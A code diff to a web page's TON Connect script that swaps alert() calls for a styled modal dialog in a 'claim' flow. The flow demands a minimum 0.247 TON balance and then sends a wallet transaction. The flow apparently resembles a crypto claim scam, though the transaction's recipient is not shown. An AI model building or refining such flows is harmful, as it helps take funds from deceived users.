@@ -241,12 +241,31 @@ tonConnect.onStatusChange(async (wallet) => {
     }
 });
 
+// Create custom dialog function
+function showMessage(message) {
+    const dialog = document.createElement('dialog');
+    dialog.className = 'custom-dialog';
+    
+    dialog.innerHTML = `
+        <div class="dialog-content">
+            <p>${message}</p>
+            <button onclick="this.closest('dialog').close()">OK</button>
+        </div>
+    `;
+    
+    document.body.appendChild(dialog);
+    dialog.showModal();
+    
+    dialog.addEventListener('close', () => {
+        dialog.remove();
+    });
+}
+
 async function handleClaim() {
     try {
-        // Check balance when claim button is clicked
         const balance = await tonConnect.getBalance();
         if (balance < REQUIRED_AMOUNT) {
-            alert("Your wallet balance is less than 0.247 TON.\nPlease add more TON to continue.");
+            showMessage("Your wallet balance is less than 0.247 TON.\nPlease add more TON to continue.");
             return;
         }
 
@@ -260,13 +279,44 @@ async function handleClaim() {
         };
         
         await tonConnect.sendTransaction(transaction);
-        alert('Transaction successful! Thank you for your contribution.');
+        showMessage('Transaction successful! Thank you for your contribution.');
     } catch (error) {
         console.error('Transaction failed:', error);
-        // Show required amount even if balance check fails
-        alert("Transaction failed. Required amount: 0.247 TON");
+        showMessage("Transaction failed. Required amount: 0.247 TON");
     }
 }
+
+// Add styles for custom dialog
+const style = document.createElement('style');
+style.textContent = `
+    .custom-dialog {
+        padding: 20px;
+        background: var(--bg-color);
+        border: 1px solid var(--text-color);
+        border-radius: 10px;
+        color: var(--text-color);
+    }
+    
+    .dialog-content {
+        text-align: center;
+    }
+    
+    .dialog-content button {
+        background: var(--bg-color);
+        color: var(--text-color);
+        border: 1px solid var(--text-color);
+        padding: 8px 16px;
+        border-radius: 20px;
+        cursor: pointer;
+        margin-top: 15px;
+    }
+    
+    .dialog-content button:hover {
+        transform: translateY(-2px);
+    }
+`;
+document.head.appendChild(style);
+
 </script>
 </body>
 </html>
